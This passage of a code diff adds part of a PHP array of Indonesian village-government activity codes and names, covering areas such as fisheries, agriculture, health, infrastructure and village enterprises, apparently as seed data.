+            [
+                'id'            => 123,
+                'ID_Keg'        => '03.03.05.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Sarana dan Prasarana Kepemudaan & Olahraga Milik Desa',
+            ],
+            [
+                'id'            => 124,
+                'ID_Keg'        => '03.03.06.',
+                'Nama_Kegiatan' => 'Pembinaan Karangtaruna\\/Klub Kepemudaan\\/Olahraga Tingkat Desa',
+            ],
+            [
+                'id'            => 125,
+                'ID_Keg'        => '03.03.90',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Kepemudaan dan Olahraga',
+            ],
+            [
+                'id'            => 126,
+                'ID_Keg'        => '03.04.01.',
+                'Nama_Kegiatan' => 'Pembinaan Lembaga Adat',
+            ],
+            [
+                'id'            => 127,
+                'ID_Keg'        => '03.04.02.',
+                'Nama_Kegiatan' => 'Pembinaan LKMD\\/LPM\\/LPMD',
+            ],
+            [
+                'id'            => 128,
+                'ID_Keg'        => '03.04.03.',
+                'Nama_Kegiatan' => 'Pembinaan PKK',
+            ],
+            [
+                'id'            => 129,
+                'ID_Keg'        => '03.04.04.',
+                'Nama_Kegiatan' => 'Pelatihan Pembinaan Lembaga Kemasyarakatan',
+            ],
+            [
+                'id'            => 130,
+                'ID_Keg'        => '03.04.92',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Kelembagaan Masyarakat',
+            ],
+            [
+                'id'            => 131,
+                'ID_Keg'        => '04.01.01.',
+                'Nama_Kegiatan' => 'Pemeliharaan Karamba\\/Kolam Perikanan Darat Milik Desa',
+            ],
+            [
+                'id'            => 132,
+                'ID_Keg'        => '04.01.02.',
+                'Nama_Kegiatan' => 'Pemeliharaan Pelabuhan Perikanan Sungai\\/Kecil Milik Desa',
+            ],
+            [
+                'id'            => 133,
+                'ID_Keg'        => '04.01.03.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Karamba\\/Kolam Perikanan Darat Milik Desa',
+            ],
+            [
+                'id'            => 134,
+                'ID_Keg'        => '04.01.04.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Pelabuhan Perikanan Sungai\\/Kecil Milik Desa',
+            ],
+            [
+                'id'            => 135,
+                'ID_Keg'        => '04.01.05.',
+                'Nama_Kegiatan' => 'Bantuan Perikanan (Bibit\\/Pakan\\/dll)',
+            ],
+            [
+                'id'            => 136,
+                'ID_Keg'        => '04.01.06.',
+                'Nama_Kegiatan' => 'Bimtek\\/Pelatihan\\/Pengenalan TTG untuk Perikanan Darat\\/Nelayan **)',
+            ],
+            [
+                'id'            => 137,
+                'ID_Keg'        => '04.01.94',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Kelautan dan Perikanan',
+            ],
+            [
+                'id'            => 138,
+                'ID_Keg'        => '04.02.01.',
+                'Nama_Kegiatan' => 'Peningkatan Produksi Tanaman Pangan (alat produksi\\/pengelolaan\\/penggilingan)',
+            ],
+            [
+                'id'            => 139,
+                'ID_Keg'        => '04.02.02.',
+                'Nama_Kegiatan' => 'Peningkatan Produksi Peternakan  (alat produksi\\/pengelolaan\\/kandang)',
+            ],
+            [
+                'id'            => 140,
+                'ID_Keg'        => '04.02.03.',
+                'Nama_Kegiatan' => 'Penguatan Ketahanan Pangan Tingkat Desa (Lumbung Desa dll)',
+            ],
+            [
+                'id'            => 141,
+                'ID_Keg'        => '04.02.04.',
+                'Nama_Kegiatan' => 'Pemeliharaan Saluran Irigasi Tersier\\/Sederhana',
+            ],
+            [
+                'id'            => 142,
+                'ID_Keg'        => '04.02.05.',
+                'Nama_Kegiatan' => 'Pelatihan\\/Bimtek\\/Pengenalan Tekonologi Tepat Guna untuk Pertanian\\/Peternakan',
+            ],
+            [
+                'id'            => 143,
+                'ID_Keg'        => '04.02.06',
+                'Nama_Kegiatan' => 'Pembangunan Saluran Irigasi Tersier\\/Sederhana',
+            ],
+            [
+                'id'            => 144,
+                'ID_Keg'        => '04.02.94',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Pertanian dan Peternakan',
+            ],
+            [
+                'id'            => 145,
+                'ID_Keg'        => '04.03.01.',
+                'Nama_Kegiatan' => 'Peningkatan Kapasitas Kepala Desa',
+            ],
+            [
+                'id'            => 146,
+                'ID_Keg'        => '04.03.02.',
+                'Nama_Kegiatan' => 'Peningkatan Kapatitas Perangkat Desa',
+            ],
+            [
+                'id'            => 147,
+                'ID_Keg'        => '04.03.03.',
+                'Nama_Kegiatan' => 'Peningkatan Kapasitas BPD',
+            ],
+            [
+                'id'            => 148,
+                'ID_Keg'        => '04.03.90',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Peningkatan Kapasitas Aparatur Desa',
+            ],
+            [
+                'id'            => 149,
+                'ID_Keg'        => '04.04.01.',
+                'Nama_Kegiatan' => 'Pelatihan dan Penyuluhan Pemberdayaan Perempuan',
+            ],
+            [
+                'id'            => 150,
+                'ID_Keg'        => '04.04.02.',
+                'Nama_Kegiatan' => 'Pelatihan dan Penyuluhan Perlindungan Anak',
+            ],
+            [
+                'id'            => 151,
+                'ID_Keg'        => '04.04.03.',
+                'Nama_Kegiatan' => 'Pelatihan dan Penguatan Penyandang Difable (Penyandang Disabilitas)',
+            ],
+            [
+                'id'            => 152,
+                'ID_Keg'        => '04.04.94',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Pemberdayaan Perempuan, Perlindungan Anak dan Keluarga',
+            ],
+            [
+                'id'            => 153,
+                'ID_Keg'        => '04.05.01.',
+                'Nama_Kegiatan' => 'Pelatihan Manajemen Koperasi\\/KUD\\/UMKM',
+            ],
+            [
+                'id'            => 154,
+                'ID_Keg'        => '04.05.02.',
+                'Nama_Kegiatan' => 'Pengembangan Sarana Prasarana Usaha Mikro, Kecil, Menengah dan Koperasi',
+            ],
+            [
+                'id'            => 155,
+                'ID_Keg'        => '04.05.03.',
+                'Nama_Kegiatan' => 'Pengadaan Teknologi Tepat Guna Untuk Pengembangan Ekonomi Pedesaan Non Pertanian',
+            ],
+            [
+                'id'            => 156,
+                'ID_Keg'        => '04.05.93',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Koperasi, Usaha Micro Kecil dan Menengah (UMKM)',
+            ],
+            [
+                'id'            => 157,
+                'ID_Keg'        => '04.06.01.',
+                'Nama_Kegiatan' => 'Pembentukan BUM Desa (Persiapan dan Pembentukan Awal BUMDesa)',
+            ],
+            [
+                'id'            => 158,
+                'ID_Keg'        => '04.06.02.',
+                'Nama_Kegiatan' => 'Pelatihan Pengelolaan BUM Desa (Pelatihan yg dilaksanakan oleh Pemdes)',
+            ],
+            [
+                'id'            => 159,
+                'ID_Keg'        => '04.06.92',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Dukungan Penanaman Modal',
+            ],
+            [
+                'id'            => 160,
+                'ID_Keg'        => '04.07.01.',
+                'Nama_Kegiatan' => 'Pemeliharaan Pasar Desa\\/Kios Milik Desa',
+            ],
+            [
+                'id'            => 161,
+                'ID_Keg'        => '04.07.02.',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehab Pasar Desa\\/Kios Milik Desa',
+            ],
+            [
+                'id'            => 162,
+                'ID_Keg'        => '04.07.03.',
+                'Nama_Kegiatan' => 'Pengembangan Industri Kecil Tingkat Desa',
+            ],
+            [
+                'id'            => 163,
+                'ID_Keg'        => '04.07.04.',
+                'Nama_Kegiatan' => 'Pembentukan\\/Fasilitasi\\/Pelatihan\\/Pendampingan kelompok usaha ekonomi produktif',
+            ],
+            [
+                'id'            => 164,
+                'ID_Keg'        => '04.07.92',
+                'Nama_Kegiatan' => 'Lain-lain Sub Bidang Perdagangan dan Perindustrian',
+            ],
+            [
+                'id'            => 165,
+                'ID_Keg'        => '05.01.01.',
+                'Nama_Kegiatan' => 'Kegiatan Penanggulanan Bencana',
+            ],
+            [
+                'id'            => 166,
+                'ID_Keg'        => '05.02.01.',
+                'Nama_Kegiatan' => 'Penanganan Keadaan Darurat',
+            ],
+            [
+                'id'            => 167,
+                'ID_Keg'        => '05.03.01.',
+                'Nama_Kegiatan' => 'Penanganan Keadaan Mendesak',
+            ],
+            [
+                'id'            => 168,
+                'ID_Keg'        => '01.01.90',
+                'Nama_Kegiatan' => 'Penyediaan Tali Asih Kepala Desa',
+            ],
+            [
+                'id'            => 169,
+                'ID_Keg'        => '01.01.91',
+                'Nama_Kegiatan' => 'Penyediaan Tali Asih Perangkat Desa',
+            ],
+            [
+                'id'            => 170,
+                'ID_Keg'        => '01.04.90',
+                'Nama_Kegiatan' => 'Penyusunan dan Penetapan Standar Satuan Harga Desa',
+            ],
+            [
+                'id'            => 171,
+                'ID_Keg'        => '01.04.91',
+                'Nama_Kegiatan' => 'Pengisian\\/Penjaringan\\/Penyaringan Kepala Desa ',
+            ],
+            [
+                'id'            => 172,
+                'ID_Keg'        => '01.04.92',
+                'Nama_Kegiatan' => 'Pengisian\\/Penjaringan\\/Penyaringan BPD**',
+            ],
+            [
+                'id'            => 173,
+                'ID_Keg'        => '01.04.93',
+                'Nama_Kegiatan' => 'Penyelenggaraan Pemilihan Kepala Desa Antar Waktu',
+            ],
+            [
+                'id'            => 174,
+                'ID_Keg'        => '01.04.94',
+                'Nama_Kegiatan' => 'Penyelenggaraan Pengisian Perangkat Desa  ',
+            ],
+            [
+                'id'            => 175,
+                'ID_Keg'        => '01.04.95',
+                'Nama_Kegiatan' => 'Penyelenggaraan Evaluasi Tingkat Perkembangan Desa ',
+            ],
+            [
+                'id'            => 176,
+                'ID_Keg'        => '01.04.96',
+                'Nama_Kegiatan' => 'Sosialisasi berbagai peraturan perundang-undangan di tingkat Desa',
+            ],
+            [
+                'id'            => 177,
+                'ID_Keg'        => '01.05.90',
+                'Nama_Kegiatan' => 'Pengadaan\\/Pelepasan Tanah Kas Desa**',
+            ],
+            [
+                'id'            => 178,
+                'ID_Keg'        => '01.05.91',
+                'Nama_Kegiatan' => 'Kompensasi\\/Ganti Rugi Lahan terdampak Pembangunan',
+            ],
+            [
+                'id'            => 179,
+                'ID_Keg'        => '01.05.92',
+                'Nama_Kegiatan' => 'Penetapan dan penegasan batas Desa',
+            ],
+            [
+                'id'            => 180,
+                'ID_Keg'        => '01.05.93',
+                'Nama_Kegiatan' => 'Penyusunan tata ruang Desa dan peta Desa',
+            ],
+            [
+                'id'            => 181,
+                'ID_Keg'        => '02.01.90',
+                'Nama_Kegiatan' => 'Pengelolaan dan Pembinaan Anak Sekolah Melalui Pemberian Makanan Tambahan Anak Sekolah (PMTAS)',
+            ],
+            [
+                'id'            => 182,
+                'ID_Keg'        => '02.01.91',
+                'Nama_Kegiatan' => 'Dukungan Sarana Prasana Pendidikan PAUD\\/TK\\/TPA\\/TKA\\/TPQ\\/Madrasah Non-Formal Bukan Milik Desa (dalam bentuk barang)',
+            ],
+            [
+                'id'            => 183,
+                'ID_Keg'        => '02.02.90',
+                'Nama_Kegiatan' => 'Pengadaan\\/pembangunan\\/pengembangan\\/ pemeliharaan Sarana dan Prasarana Kesehatan\\/ Air Bersih \\/sanitasi\\/kebersihan lingkungan\\/jambanisasi\\/mandi, cuci, kakus (MCK) **',
+            ],
+            [
+                'id'            => 184,
+                'ID_Keg'        => '02.02.91',
+                'Nama_Kegiatan' => 'Pemantauan dan Pencegahan Penyalahgunaan Narkoba dan Zat Adiktif Di Desa',
+            ],
+            [
+                'id'            => 185,
+                'ID_Keg'        => '02.02.92',
+                'Nama_Kegiatan' => 'Fasilitasi Pelayanan Pencegahan dan Penanggulangan Penyakit Endemik, Menular dan Tidak Menular',
+            ],
+            [
+                'id'            => 186,
+                'ID_Keg'        => '02.02.93',
+                'Nama_Kegiatan' => 'Pembangunan\\/Pengelolaan\\/Pemanfaatan Tanaman Obat Keluarga\\/Apotek Desa',
+            ],
+            [
+                'id'            => 187,
+                'ID_Keg'        => '02.02.94',
+                'Nama_Kegiatan' => 'Fasilitasi Kegiatan Palang Merah Indonesia (PMI)',
+            ],
+            [
+                'id'            => 188,
+                'ID_Keg'        => '02.02.95',
+                'Nama_Kegiatan' => 'Pengadaan\\/pembangunan\\/pengembangan\\/ pemeliharaan sarana prasarana alat bantu penyandang disabilitas\\/panti rehabilitasi penyandang disabilitas**',
+            ],
+            [
+                'id'            => 189,
+                'ID_Keg'        => '02.02.96',
+                'Nama_Kegiatan' => 'Fasilitasi Pelayanan Kesehatan Bagi Masyarakat Miskin',
+            ],
+            [
+                'id'            => 190,
+                'ID_Keg'        => '02.02.97',
+                'Nama_Kegiatan' => 'Penyelenggaraan Promosi Kesehatan dan Gerakan Hidup Bersih dan Sehat',
+            ],
+            [
+                'id'            => 191,
+                'ID_Keg'        => '02.02.98',
+                'Nama_Kegiatan' => 'Pengadaan\\/pembangunan\\/pengembangan\\/pemeliharaan sarana prasarana mobil\\/kapal motor untuk ambulance Desa**',
+            ],
+            [
+                'id'            => 192,
+                'ID_Keg'        => '02.02.99',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Kesehatan',
+            ],
+            [
+                'id'            => 193,
+                'ID_Keg'        => '02.03.90',
+                'Nama_Kegiatan' => 'Pembangunan\\/pemeliharaan jalan\\/talud pengaman tebing\\/saluran irigasi\\/energi baru dan terbarukan\\/ pembangkit listrik tenaga mikrohidro\\/lapangan Desa \\/ taman Desa\\/lingkungan permukiman masyarakat Desa**',
+            ],
+            [
+                'id'            => 194,
+                'ID_Keg'        => '02.03.91',
+                'Nama_Kegiatan' => 'Pembangunan\\/Pengadaan\\/pengembangan\\/pemeliharaan sarana dan prasarana Jasa dan Industri Kecil\\/industri rumah tangga\\/mesin jahit\\/peralatan bengkel kendaraan bermotor\\/mesin bubut untuk mebeler; \\/pemasara',
+            ],
+            [
+                'id'            => 195,
+                'ID_Keg'        => '02.03.92',
+                'Nama_Kegiatan' => 'Pembangunan kolam ikan dan pembenihan ikan\\/perahu penangkap ikan tempat pelelangan ikan\\/tempat pendaratan kapal penangkap ikan\\/cold storage (gudang pendingin)\\/gudang penyimpan sarana produksi (saprota',
+            ],
+            [
+                'id'            => 196,
+                'ID_Keg'        => '02.03.93',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Pemeliharaan\\/Peningkatan Sarana Prasarana Olah Raga\\/ Gedung Serba Guna',
+            ],
+            [
+                'id'            => 197,
+                'ID_Keg'        => '02.03.94',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Gedung\\/Prasarana Balai Desa\\/Balai Kemasyarakatan',
+            ],
+            [
+                'id'            => 198,
+                'ID_Keg'        => '02.03.95',
+                'Nama_Kegiatan' => 'Pembangunan\\/pengembangan\\/pemeliharaan\\/pengelolaan sarana dan prasarana pasar Desa**',
+            ],
+            [
+                'id'            => 199,
+                'ID_Keg'        => '02.03.96',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Pekerjaan Umum dan Tata Ruang',
+            ],
+            [
+                'id'            => 200,
+                'ID_Keg'        => '02.04.91',
+                'Nama_Kegiatan' => 'Penyediaan Kendaraan Pengangkut Sampah, Gerobak Sampah, Tong Sampah, Mesin Pengolah Sampah',
+            ],
+            [
+                'id'            => 201,
+                'ID_Keg'        => '02.04.92',
+                'Nama_Kegiatan' => 'Pemeliharaan Jaringan Listrik\\/ Penerangan Desa',
+            ],
+            [
+                'id'            => 202,
+                'ID_Keg'        => '02.04.93',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Jaringan Listrik\\/ Penerangan Desa',
+            ],
+            [
+                'id'            => 203,
+                'ID_Keg'        => '02.05.90',
+                'Nama_Kegiatan' => 'Pembuatan terasering\\/pembersihan daerah aliran sungai\\/plesengan sungai**',
+            ],
+            [
+                'id'            => 204,
+                'ID_Keg'        => '02.05.91',
+                'Nama_Kegiatan' => 'Penanganan kebakaran hutan dan lahan\\/pencegahan abrasi pantai',
+            ],
+            [
+                'id'            => 205,
+                'ID_Keg'        => '02.06.90',
+                'Nama_Kegiatan' => 'Pembangunan\\/Pengembangan\\/pemeliharaan sarana dan prasarana transportasi\\/informasi\\/ komunikasi\\/terminal Desa',
+            ],
+            [
+                'id'            => 206,
+                'ID_Keg'        => '02.06.91',
+                'Nama_Kegiatan' => 'Pengadaan\\/pembangunan\\/pengembangan\\/pemeliharaan jaringan internet untuk warga Desa\\/website Desa\\/peralatan pengeras suara (loudspeaker)\\/telepon umum\\/ radio Single Side Band (SSB) ',
+            ],
+            [
+                'id'            => 207,
+                'ID_Keg'        => '02.07.90',
+                'Nama_Kegiatan' => 'Pengembangan dan Pengelolaan Sarana dan Prasarana Energi Alternatif tingkat Desa',
+            ],
+            [
+                'id'            => 208,
+                'ID_Keg'        => '02.07.91',
+                'Nama_Kegiatan' => 'Pembangunan sarana dan prasarana Teknologi Tepat Guna',
+            ],
+            [
+                'id'            => 209,
+                'ID_Keg'        => '02.07.92',
+                'Nama_Kegiatan' => 'Pengadaan\\/pemanfaatan\\/pemeliharaan penggilingan padi\\/peraut kelapa\\/ penepung biji-bijian\\/pencacah pakan terna\\/sangrai\\/ pemotong\\/pengiris buah dan sayuran\\/pompa air\\/traktor mini**',
+            ],
+            [
+                'id'            => 210,
+                'ID_Keg'        => '02.07.94',
+                'Nama_Kegiatan' => 'Lain-lain Kegiatan Sub Bidang Energi dan Sumber Daya Mineral',
+            ],
+            [
+                'id'            => 211,
+                'ID_Keg'        => '02.08.90',
+                'Nama_Kegiatan' => 'Pengadaan\\/pembangunan\\/pengembangan\\/pemeliharaan sarana dan prasarana Desa wisata\\/ pondok wisata\\/panggung hiburan\\/ kios cenderamata\\/kios warung makan\\/wahana permainan anak\\/wahana permainan outbound\\/ ta',
+            ],
+            [
+                'id'            => 212,
+                'ID_Keg'        => '03.01.90',
+                'Nama_Kegiatan' => 'Dukungan Pembinaan Keamanan, Ketertiban, dan Ketentraman Wilayah dan Masyarakat Desa (Seragam dan Op Linmas, BABINSA, BABINKAMTIBMAS)',
+            ],
+            [
+                'id'            => 213,
+                'ID_Keg'        => '03.01.91',
+                'Nama_Kegiatan' => 'Pembentukan tim keamanan Desa',
+            ],
+            [
+                'id'            => 214,
+                'ID_Keg'        => '03.02.90',
+                'Nama_Kegiatan' => 'Melestarikan Dan Mengembangkan Gotong Royong Masyarakat Desa (BBGRM)',
+            ],
+            [
+                'id'            => 215,
+                'ID_Keg'        => '03.02.91',
+                'Nama_Kegiatan' => 'Dukungan Pengelolaan Sarana dan Prasarana Kebudayaan\\/Rumah Adat\\/Keagamaan di Desa **',
+            ],
+            [
+                'id'            => 216,
+                'ID_Keg'        => '03.02.92',
+                'Nama_Kegiatan' => 'Penyelenggaraan Sedekah Bumi\\/Sedekah Laut\\/Apitan',
+            ],
+            [
+                'id'            => 217,
+                'ID_Keg'        => '03.02.93',
+                'Nama_Kegiatan' => 'Partisipasi Perayaan Hari Besar Nasional lainnya',
+            ],
+            [
+                'id'            => 218,
+                'ID_Keg'        => '03.02.94',
+                'Nama_Kegiatan' => 'Pembinaan kerukunan umat beragama',
+            ],
+            [
+                'id'            => 219,
+                'ID_Keg'        => '03.04.90',
+                'Nama_Kegiatan' => 'Pembentukan\\/Pembinaan Lembaga Kemasyarakatan',
+            ],
+            [
+                'id'            => 220,
+                'ID_Keg'        => '03.04.91',
+                'Nama_Kegiatan' => 'Pembentukan dan Dukungan Fasilitasi Kader Pembangunan dan Pemberdayaan Masyarakat',
+            ],
+            [
+                'id'            => 221,
+                'ID_Keg'        => '04.01.90',
+                'Nama_Kegiatan' => 'Pelaksanaan Penanggulangan Hama dan Penyakit Secara Terpadu',
+            ],
+            [
+                'id'            => 222,
+                'ID_Keg'        => '04.01.91',
+                'Nama_Kegiatan' => 'Pengelolaan Balai Benih Ikan Milik Desa',
+            ],
+            [
+                'id'            => 223,
+                'ID_Keg'        => '04.01.92',
+                'Nama_Kegiatan' => 'Pemeliharaan Tambatan Perahu\\/Tempat Pelelangan Ikan (TPI) Milik Desa**',
+            ],
+            [
+                'id'            => 224,
+                'ID_Keg'        => '04.01.93',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Tambatan Perahu\\/Tempat Pelelangan Ikan (TPI) Milik Desa**',
+            ],
+            [
+                'id'            => 225,
+                'ID_Keg'        => '04.02.90',
+                'Nama_Kegiatan' => 'Peningkatan Produksi Tanaman Perkebunan (Alat Produksi dan pengolahan perkebunan)',
+            ],
+            [
+                'id'            => 226,
+                'ID_Keg'        => '04.02.91',
+                'Nama_Kegiatan' => 'Pembangunan\\/Rehabilitasi\\/Peningkatan Balai Pertemuan Kelompok Tani',
+            ],
+            [
+                'id'            => 227,
+                'ID_Keg'        => '04.02.92',
+                'Nama_Kegiatan' => 'Pembangunan\\/Peningkatan Irigasi Tersier',
+            ],
+            [
+                'id'            => 228,
+                'ID_Keg'        => '04.02.93',
+                'Nama_Kegiatan' => 'Pelatihan kelompok tani',
+            ],
+            [
+                'id'            => 229,
+                'ID_Keg'        => '04.04.90',
+                'Nama_Kegiatan' => 'Fasiilitasi Penguatan Kelembagaan Pengarusutamaan Gender dan Anak',
+            ],
+            [
+                'id'            => 230,
+                'ID_Keg'        => '04.04.92',
+                'Nama_Kegiatan' => 'Peningkatan Kapasitas Kelompok Pemerhati dan Perlindungan Anak',
+            ],
+            [
+                'id'            => 231,
+                'ID_Keg'        => '04.04.93',
+                'Nama_Kegiatan' => 'Fasilitasi terhadap kelompok-kelompok rentan, kelompok masyarakat miskin, perempuan, anak dan difabel\\/ Pemberian bantuan sosial\\/pemberian santunan kepada keluarga fakir miskin\\/analisis kemiskinan seca',
+            ],
+            [
+                'id'            => 232,
+                'ID_Keg'        => '04.04.91',
+                'Nama_Kegiatan' => 'Fasilitasi Upaya Perlindungan Perempuan dan Anak Terhadap Tindakan Kekerasan',
+            ],
+            [
+                'id'            => 233,
+                'ID_Keg'        => '04.05.90',
+                'Nama_Kegiatan' => 'Pengembangan\\/ Promosi Produk Unggulan Desa',
+            ],
+            [
+                'id'            => 234,
+                'ID_Keg'        => '04.05.91',
+                'Nama_Kegiatan' => 'Pembentukan dan pengembangan usaha ekonomi masyarakat dan\\/atau koperasi',
+            ],
+            [
+                'id'            => 235,
+                'ID_Keg'        => '04.05.92',
+                'Nama_Kegiatan' => 'Bantuan sarana produksi, distribusi dan pemasaran untuk usaha ekonomi masyarakat**',
+            ],
+            [
+                'id'            => 236,
+                'ID_Keg'        => '04.06.90',
+                'Nama_Kegiatan' => 'Pembangunan Kantor BUM Desa\\/Sarana Prasarana BUM Desa  (menjadi aset desa)**',
+            ],
+            [
+                'id'            => 237,
+                'ID_Keg'        => '04.06.91',
+                'Nama_Kegiatan' => 'Pelaksanaan Audit Keuangan BUM Desa, Evaluasi Perkembangan BUM Desa ',
+            ],
+            [
+                'id'            => 238,
+                'ID_Keg'        => '04.07.90',
+                'Nama_Kegiatan' => 'Pelatihan usaha ekonomi dan Perdagangan',
+            ],
+            [
+                'id'            => 239,
+                'ID_Keg'        => '04.07.91',
+                'Nama_Kegiatan' => 'Sosialisasi Teknologi Tepat Guna\\/Posyantekdes dan\\/atau antar Desa\\/percontohan Teknologi Tepat Guna untuk produksi pertanian\\/pengembangan sumber energi perdesaan\\/pengemban',
+            ],
+        ];
+    }
+}
